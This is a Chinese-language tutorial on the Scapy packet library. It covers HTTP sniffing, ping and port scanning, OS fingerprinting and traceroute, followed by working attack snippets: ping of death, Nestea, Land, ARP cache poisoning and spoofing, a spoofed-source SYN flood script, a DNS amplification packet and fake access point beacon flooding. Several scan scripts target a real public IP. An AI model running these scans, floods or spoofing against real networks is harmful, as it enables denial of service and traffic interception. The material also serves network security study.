由于scapy提供的协议层只到TCP层，没有实现HTTP层，因此scapy 不支持对 HTTP 数据包的嗅探和捕获（由于TCP数据包的重组，HTTP数据包可能在多个TCP数据包中，单一数据包往往没有实际意义）；

因此，对 HTTP 数据包的嗅探和捕获需要借助第三方提供的scapy-http模块https://github.com/invernizzi/scapy-http；

例：
```python
import scapy_http.http as HTTP
count=0
from scapy.all import *
from scapy.error import Scapy_Exception


def pktTCP(pkt):
    global count
    count=count+1
    print count
    if HTTP.HTTPRequest or HTTP.HTTPResponse in pkt:
        src=pkt[IP].src
        srcport=pkt[IP].sport
        dst=pkt[IP].dst
        dstport=pkt[IP].dport
        test=pkt[TCP].payload
        if HTTP.HTTPRequest in pkt:
            #print "HTTP Request:"
            #print test
            print "======================================================================"
        if HTTP.HTTPResponse in pkt:
            print "HTTP Response:"
            try:
                headers,body= str(test).split("\r\n\r\n", 1)
                print headers
            except Exception,e:
                print e
            print "======================================================================"
    else:
        #print pkt[IP].src,pkt[IP].sport,'->',pkt[TCP].flags
        print 'other'

sniff(filter='tcp and port 80',prn=pktTCP)
```

## Scanning ##
### ping ###

#### ICMP Ping ####
可以用以下的命令来模拟经典的ICMP Ping：
```
>>> ans,unans=sr(IP(dst="192.168.1.1-254")/ICMP())
```
用以下的命令可以收集存活主机的信息：
```
>>> ans.summary(lambda (s,r): r.sprintf("%IP.src% is alive") )
```

例：ttl应该改为64     
![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/0217d8d487c0f448530608855fd98d35.jpg)

![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/07b103d78b0b46eceaca1daae3de6ee8.jpg)




#### ARP Ping ####
实际情况下，ping扫描的实用性往往并不理想，因为现在设备的firewall都默认禁止ping响应；如果是在直连的以太网络中，则可以使用ARP扫描代替IP扫描，除了扫描速度大大提升，实用性也大大提高，因为几乎所有设备都会对ARP请求进行响应；

例：
```
>>> ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2, iface=eth0.2, verbose=False)
# verbose=False 表示不显示发送和接收过程的详细信息，默认值为True，即开启显示
```
用以下命令可以来审查应答：
```
>>> ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%"))
```

![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/d7207a5ca8641d3fe834d29760927c34.jpg)


Scapy包含内建函数arping()，该函数实现的功能和以上的两个命令类似：
```
>>> arping("192.168.1.*")
```

![image](http://otaivnlxc.bkt.clouddn.com/jpg/2017/9/19/9e42252d2c00f42a1516ee6fbcf36e2a.jpg)


#### TCP SYN Ping ####
如果ICMP　echo请求被禁止了，我们依旧可以用不同的TCP Pings，就像下面的TCP SYN Ping:
```
>>> ans,unans=sr( IP(dst="192.168.1.*")/TCP(dport=80,flags="S") )
```
对我们的刺探有任何响应就意味着为一台存活主机，可以用以下的命令收集结果：
```
>>> ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
```


#### UDP Ping ####

如果其他的都失败了，还可以使用UDP Ping，它可以让存活主机产生ICMP Port unreachable错误。你可以挑选任何极有可能关闭的端口，就像端口0：
```
>>> ans,unans=sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
```
同样的，使用以下命令收集结果：
```
>>> ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
```

### IP Scanning ###

例：
```
>>> ans,unans=sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)
```


### Ports Scanning ###
Scapy 的端口扫描功能基于数据包的发送来编写脚本完成；

#### TCP Connect Scans ####
TCP (全)连接扫描：
客户端与服务器建立 TCP 连接要进行一次三次握手，如果进行了一次成功的三次握手，则说明端口是开放的；

例：
```python
# encoding=utf-8

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"  # 百度 IP
src_port = RandShort()
dst_port = 80

# 发送 TCP 连接请求
tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S"), timeout=10) # SYN

# 根据TCP 连接情况判断该端口开放情况
if str(type(tcp_connect_scan_resp)) == "":
    print("Closed")
elif tcp_connect_scan_resp.haslayer(TCP):
if tcp_connect_scan_resp.getlayer(TCP).flags == 0x12:	# SYN / ACK
	# 完成 TCP 全连接
        send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="AR"), timeout=10)	# ACK / RST
        print("Open")
elif tcp_connect_scan_resp.getlayer(TCP).flags == 0x14:	# ACK / RST
    print("Closed")
```

#### TCP SYN Scans ####

TCP SYN 扫描 / 半开式扫描 / half-open scanning / stealth 扫描：
这种扫描没有完成一个完整的 TCP 连接，这种方法向目标端口发送一个SYN分组（packet），如果目标端口返回带有 SYN/ACK 标识的数据包，那么该端口肯定处于检听状态；否则，返回的是RST/ACK；
客户端收到响应后，不会返回 RST/ACK 标识的数据包而是返回一个只带有 RST 标识的数据包；

这种扫描技术主要用于躲避防火墙的检测；

例：
发送一个TCP SYN到每一个端口上，等待一个SYN-ACK或者是RST或者是一个ICMP错误：
```
>>> res,unans = sr( IP(dst="target")
                /TCP(flags="S", dport=(1,1024)) )
```
将开放的端口结果可视化：
```
>>> res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
```

例：
```python
#!/usr/bin/env python
#coding=utf-8

from scapy.all import *
from scapy.error import Scapy_Exception


def synscan(domain,port):
	result=sr1(IP(dst=domain)/TCP(dport=port,flags="S"),timeout=10)
	if result:
		print 'got answer'
		if (result[TCP].flags==18):
			print 'port open'
	else:
		print 'not got answer'

synscan('www.baidu.org', 80)
```

例：
```python
# encoding=utf-8

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"  # 百度 IP
src_port = RandShort()
dst_port = 80

# 发送 TCP 连接请求
stealth_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S"), timeout=10)		#SYN

# 根据TCP 连接情况判断该端口开放情况
if str(type(stealth_scan_resp)) == "":
    print("Filtered")
elif stealth_scan_resp.haslayer(TCP):
    if stealth_scan_resp.getlayer(TCP).flags == 0x12:
        send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="R"), timeout=10) 		# RST
        print("Open")
    elif stealth_scan_resp.getlayer(TCP).flags == 0x14:	
        print("Closed")
elif stealth_scan_resp.haslayer(ICMP):
	# 如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态
    if int(stealth_scan_resp.getlayer(ICMP).type) == 3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]:
        print("Filtered")
```

#### TCP XmasTres Scans ####

TCP 圣诞树(Xmas Tree)扫描：
客户端会向服务器发送带有 PSH,FIN,URG 标识和端口号的数据包给服务器。如果目标端口是开放的，那么不会有任何来自服务器的回应。如果服务器返回了一个带有 RST 标识的 TCP 数据包，那么说明端口处于关闭状态。但如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态。

例：
```python
# encoding=utf-8

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"  # 百度 IP，若出错则换成内网ip，如172.16.2.79
src_port = RandShort()
dst_port = 80

xmas_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port, flags="FPU"), timeout=10)
if str(type(xmas_scan_resp)) == "":
    print("Open|Filtered")
elif xmas_scan_resp.haslayer(TCP):
    if xmas_scan_resp.getlayer(TCP).flags == 0x14:
        print("Closed")
elif xmas_scan_resp.haslayer(ICMP):
	# 如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态
    if int(xmas_scan_resp.getlayer(ICMP).type) == 3 and int(xmas_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]:
        print("Filtered")
```

#### TCP FIN Scans ####
TCP FIN 扫描：
FIN 扫描会向服务器发送带有 FIN 标识和端口号的 TCP 数据包。如果没有服务器端回应则说明端口开放。如果服务器返回一个 RST 数据包，则说明目标端口是关闭的。如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 代码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定端口状态。

例：
```python
# encoding=utf-8

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"  # 百度 IP，若出错则换成内网ip，如172.16.2.79
src_port = RandShort()
dst_port = 80

fin_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port, flags="F"), timeout=10)
if str(type(fin_scan_resp)) == "":
    print("Open|Filtered")
elif fin_scan_resp.haslayer(TCP):
    if fin_scan_resp.getlayer(TCP).flags == 0x14:
        print("Closed")
elif fin_scan_resp.haslayer(ICMP):
    if int(fin_scan_resp.getlayer(ICMP).type) == 3 and int(fin_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]:
        print("Filtered")
```


#### TCP NULL Scans ####
TCP 空扫描(Null)：

例：
```python
# encoding=utf-8

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"  # 百度 IP
src_port = RandShort()
dst_port = 80

null_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port, flags=""), timeout=10)
if str(type(null_scan_resp)) == "":
    print("Open|Filtered")
elif null_scan_resp.haslayer(TCP):
    if null_scan_resp.getlayer(TCP).flags == 0x14:
        print("Closed")
elif null_scan_resp.haslayer(ICMP):
    if int(null_scan_resp.getlayer(ICMP).type) == 3 and int(null_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]:
        print("Filtered")
```


#### TCP ACK Scans ####

例：
```python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"
src_port = RandShort()
dst_port=80

ack_flag_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port,flags="A"),timeout=10)
if (str(type(ack_flag_scan_resp))==""):
    print "Stateful firewall presentn(Filtered)"
elif(ack_flag_scan_resp.haslayer(TCP)):
    if(ack_flag_scan_resp.getlayer(TCP).flags == 0x4):
        print "No firewalln(Unfiltered)"
elif(ack_flag_scan_resp.haslayer(ICMP)):
    if(int(ack_flag_scan_resp.getlayer(ICMP).type)==3 and int(ack_flag_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
        print "Stateful firewall presentn(Filtered)"
```


#### TCP WIN Scans ####

TCP 窗口扫描：


例：
```python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"
src_port = RandShort()
dst_port=80

window_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port,flags="A"),timeout=10)
if (str(type(window_scan_resp))==""):
    print "No response"
elif(window_scan_resp.haslayer(TCP)):
    if(window_scan_resp.getlayer(TCP).window == 0):
        print "Closed"
    elif(window_scan_resp.getlayer(TCP).window > 0):
        print "Open"
```


#### UDP Scans ####

例：
```python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dst_ip = "180.97.33.107"
src_port = RandShort()
dst_port=53
dst_timeout=10

def udp_scan(dst_ip,dst_port,dst_timeout):
    udp_scan_resp = sr1(IP(dst=dst_ip)/UDP(dport=dst_port),timeout=dst_timeout)
    if (str(type(udp_scan_resp))==""):
        retrans = []
        for count in range(0,3):
            retrans.append(sr1(IP(dst=dst_ip)/UDP(dport=dst_port),timeout=dst_timeout))
        for item in retrans:
            if (str(type(item))!=""):
                udp_scan(dst_ip,dst_port,dst_timeout)
        return "Open|Filtered"
    elif (udp_scan_resp.haslayer(UDP)):
        return "Open"
    elif(udp_scan_resp.haslayer(ICMP)):
        if(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code)==3):
            return "Closed"
        elif(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code) in [1,2,9,10,13]):
            return "Filtered"

print udp_scan(dst_ip,dst_port,dst_timeout)
```

#### 多路 Scans ####

多路扫描即整合了所有可用的扫描种类，将这些扫描集成到一个模块之中；

例：
https://github.com/interference-security/Multiport/blob/master/multiport.py 
使用
```
$ python multiport.py 180.97.33.107 -p 80
```




## OS Fingerprinting ##

### ISN ###

Scapy的可用于分析ISN（初始序列号）递增来发现可能有漏洞的系统。首先我们将在一个循环中发送SYN探头，来收集目标响应：
```
>>> ans,unans=srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
一旦我们得到响应之后，我们可以像这样开始分析收集到的数据：
>>> temp = 0
>>> for s,r in ans:
...    temp = r[TCP].seq - temp
...    print str(r[TCP].seq) + "\t+" + str(temp)
...
4278709328      +4275758673
4279655607      +3896934
4280642461      +4276745527
4281648240      +4902713
4282645099      +4277742386
4283643696      +5901310
```

## nmap_fp ##

在Scapy中支持Nmap指纹识别（是到Nmap v4.20的“第一代”功能）。在Scapy v2中，你首先得加载扩展模块：
```
>>> load_module("nmap")
如果你已经安装了Nmap，你可以让Scapy使用它的主动操作系统指纹数据库。清确保version 1签名数据库位于指定的路径：
>>> conf.nmap_base
然后你可以使用namp_fp()函数，该函数和Nmap操作系统检测引擎使用同样的探针：
>>> nmap_fp("192.168.1.1",oport=443,cport=1)
Begin emission:
.****..**Finished to send 8 packets.
*................................................
Received 58 packets, got 7 answers, remaining 1 packets
(1.0, ['Linux 2.4.0 - 2.5.20', 'Linux 2.4.19 w/grsecurity patch',
'Linux 2.4.20 - 2.4.22 w/grsecurity.org patch', 'Linux 2.4.22-ck2 (x86)
w/grsecurity.org and HZ=1000 patches', 'Linux 2.4.7 - 2.6.11'])
```

### p0f ###

如果你已在操作系统中安装了p0f，你可以直接从Scapy中使用它来猜测操作系统名称和版本。（仅在SYN数据库被使用时）。首先要确保p0f数据库存在于指定的路径：
```
>>> conf.p0f_base
例如，根据一个捕获的数据包猜测操作系统：
>>> sniff(prn=prnp0f)
192.168.1.100:54716 - Linux 2.6 (newer, 1) (up: 24 hrs)
  -> 74.125.19.104:www (distance 0)
<Sniffed: TCP:339 UDP:2 ICMP:0 Other:156>
```


## Route Traceroute ##
Route Traceroute 用于追踪出发点到目的地所经过的路径，即信息从你的计算机到互联网另一端的主机是走的什么路径；

注意每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的；

### TCP SYN traceroute ###

例：
```
>>> ans,unans=sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))
>>> ans.summary( lambda(s,r) : r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
192.168.1.1     time-exceeded
68.86.90.162    time-exceeded
4.79.43.134     time-exceeded
4.79.43.133     time-exceeded
4.68.18.126     time-exceeded
4.68.123.38     time-exceeded
4.2.2.1         SA
```

例：
```python
# coding=utf-8

from scapy.all import *  
  
  
ans, unans=sr(IP(dst="www.baidu.com", ttl=(2,25), id=RandShort())/TCP(flags=0x2), timeout=50)
for snd,rcv in ans:  
    print snd.ttl,rcv.src,isinstance(rcv.payload,TCP)
```

例：
捕获并输出数据包在网络中跳转时的 IP 地址，以及使用的网络协议
```python
# coding=utf-8

from scapy.all import *

ans, unans = sr(IP(dst="www.baidu.com", ttl=(2, 25), id=RandShort())/TCP(flags=0x2))
for snd, rcv in ans:
    print("{0}\t{1}\t{2}".format(snd.ttl, rcv.src, isinstance(rcv.payload, TCP)))
```
运行结果：
```
[root@localhost scapy]# python route_tracking.py
WARNING: No route found for IPv6 destination :: (no default route?)
Begin emission:
...*.**..***.***..**.*..**..**.**.*.*.Finished to send 24 packets.
*.*..*..................^C
Received 62 packets, got 23 answers, remaining 1 packets
2       121.225.2.1     False
3       218.2.151.29    False
4       221.231.206.209 False
5       202.102.69.10   False
6       180.97.32.10    False
7       10.203.195.6    False
8       180.97.33.107   True
9       180.97.33.107   True
10      180.97.33.107   True
11      180.97.33.107   True
12      180.97.33.107   True
13      180.97.33.107   True
14      180.97.33.107   True
15      180.97.33.107   True
16      180.97.33.107   True
17      180.97.33.107   True
18      180.97.33.107   True
19      180.97.33.107   True
20      180.97.33.107   True
21      180.97.33.107   True
22      180.97.33.107   True
23      180.97.33.107   True
24      180.97.33.107   True
```


### UDP traceroute ###

相比较TCP来说， traceroute一个UDP应用程序是不可靠的，因为UDP没有握手的过程，我们需要给一个应用性的有效载荷（DNS，ISAKMP，NTP等）来得到一个应答：
```
>>> res,unans = sr(IP(dst="target", ttl=(1,20))/UDP()/DNS(qd=DNSQR>(qname="test.com"))
```
我们可以想象得到一个路由器列表的结果：
```
>>> res.make_table(lambda (s,r): (s.dst, s.ttl, r.src))
```


### DNS traceroute ###

我们可以在traceroute()函数中设置l4参数为一个完整的数据包，来实现DNS traceroute：
```
>>> ans,unans=traceroute("4.2.2.1",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawl.org")))
Begin emission:
..*....******...******.***...****Finished to send 30 packets.
*****...***...............................
Received 75 packets, got 28 answers, remaining 2 packets
   4.2.2.1:udp53
1  192.168.1.1     11
4  68.86.90.162    11
5  4.79.43.134     11
6  4.79.43.133     11
7  4.68.18.62      11
8  4.68.123.6      11
9  4.2.2.1
...
```


## Classic Attrack Achieve ##
### Maiformed packets ###

例：
```
>>> send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
```

### Ping of Death ###

ping of death 是一种向目标电脑发送错误封包的或恶意的ping指令的攻击方式；

一般而言，在ICMP规范中，ICMP回送消息在数据包的数据部分只有65,536个字节，送出超过65,536字节ping封包对IP通讯协定而言不是合法用法，若送出ping封包时分成多个片段，目标电脑必须不断重组封包，期间可能因发缓冲区溢位，而导致系统崩溃；

在1997-1998年后几乎所有的现代系统都已经修正了这问题；
例：
```
>>> send(fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
```

### Nestea attack ###

```
>>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
>>> send(IP(dst=target, id=42, frag=48)/("X"*116))
>>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
```



### Land attack ###

(designed for Microsoft Windows)

```
>>> send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
```

## ARP attack ##

### ARP Cache Poisoning ###

通过VLAN跳跃攻击进行ARP缓存投毒，使得其他客户端无法加入真实的网关地址；

经典的ARP缓存投毒：　
```　　　
>>> send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )
```

使用 double 802.1q encapsulation 进行ARP缓存投毒：
```
>>> send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
      /ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )
```

### ARP Spoofing Attack ###

https://juejin.im/entry/588478d5128fe1006c380ec1 
ARP 欺骗攻击，通过向局域网中发送大量伪造了MAC和IP地址的ARP包，诱骗局域网中其它主机将本机当作默认网关，而将其数据发送到本机；


例：
将本机流量转发到默认网关，才能不影响其它主机连接外网：
```
vim /etc/sysctl.conf
```
取消 ”#nett.ipv4.ip_forward=1” 的注释；
增加流量转发规则：
```
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables-save
```

发送ARP欺骗包
```
# psrc设为网关的ip地址，以伪装成是从网关发出的ARP包
# pdst设为广播地址，则对局域网内所有设备进行攻击，也可设置为某个ip，只对单一主机进行攻击
# hwsrc设为本机MAC地址，以诱使其它被攻击主机将数据包发送到本机
# hwdst设为广播MAC地址，也可设置为单个MAC地址
# srploop() 循环发送该ARP包
srploop(ARP(op=2, pdst=attackIP, psrc="192.168.1.100", hdst="FF:FF:FF:FF:FF:FF", hwsrc="00:66:66:66:66:66"), timeout=2)
```

## DDos ##
### SYN Flood Attack ###

SYN Flood Attack / SYNDdos Attack / SYN 泛洪攻击是一种比较常用的DdoS方式之一，通过发送大量**伪造源 IP 地址**的 TCP 连接请求，**使得目标主机建立大量 TCP 半连接**而资源耗尽 (通常是CPU满负荷或者内存不足)；

原理：
- TCP连接需要完成三次握手：正常情况下客户端首先向服务端发送SYN报文，随后服务端回以SYN+ACK报文到达客户端，最后客户端向服务端发送ACK报文完成三次握手；

- 而SYN泛洪攻击则是通过使用虚假的源 IP，导致客户端向服务器发送SYN报文之后，没有客户端能响应服务器回应的 SYN/ACK 报文(响应发送到了一个虚假的不存在的 IP 上，自然得不到响应)，也就是将 TCP 处在 “半连接” 状态；
由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，当然如果超过一定的时间内没有接收到客户端的报文，本次连接在协议栈中存储的数据将会被丢弃。攻击者如果利用这段时间发送大量的连接请求，全部挂起在半连接状态。这样将不断消耗服务器资源，直到拒绝服务；

<!-- TODO Q：若使用 scapy 此类工具，不伪造源 IP 直接发送 SYN 包的情况下，本机收到 目标主机的 SYN/ACK 响应会自动回复 ACK？还是不回复？ -->



例：
```python
import random
from scapy.all import *

def synFlood(tgt,dPort):
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer 
        send(packet)
```

### DNS Amplification Attack ###


DNS 放大攻击 / DNS 杠杆攻击：
利用DNS回复包比DNS查询包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标，以达到对目标服务器DDoS的效果；
要实现 DNS 放大，需要使用的 DNS 服务器支持递归查询；

例：
```python
# 构造IP包
i = IP(dst='8.8.8.8', src='192.168.1.200') # 8.8.8.8为要攻击的目标DNS，192.168.1.200 为伪造的源ip
# 构造UDP包
u = UDP(dport=53)
# 构造DNS包
d = DNS(rd=1, qdcout=1)
# 设置DNS查询内容
d.qd = DNSQR(qname=”www.baidu.com”, qtype=255)
# 组合成最终查询包
package = (i/u/d)
# 发送查询包并将响应写入到本地dns.pcap文件中
wrpcap(“dns.pcap”, sr1(package))
通过使用wireshark查看dns.pcap可知：查询时发送的数据包为 68 字节，但响应包为118字节，即基本实现了使用放大流量的目的，通过加入循环等具体措施可使效果增强；
```


## Wireless frame injection ##

frame injection的前提是你的无线网卡和驱动得正确配置好。

```
$ ifconfig wlan0 up
$ iwpriv wlan0 hostapd 1
$ ifconfig wlan0ap up
```

例：构造一个FakeAP
```
>>> sendp(Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/
          Dot11Beacon(cap="ESS")/
          Dot11Elt(ID="SSID",info=RandString(RandNum(1,50)))/
          Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
          Dot11Elt(ID="DSset",info="\x03")/
          Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"),iface="wlan0ap",loop=1)
```


## Related Links ##
官方文档：https://scapy.readthedocs.io/en/latest  
中文文档：https://wizardforcel.gitbooks.io/scapy-docs/content/3.html   
参考：   
http://www.jinglingshu.org/?p=10390    
http://blog.csdn.net/lemon_tree12138/article/details/51141440    
http://blog.csdn.net/lemon_tree12138/article/details/51198116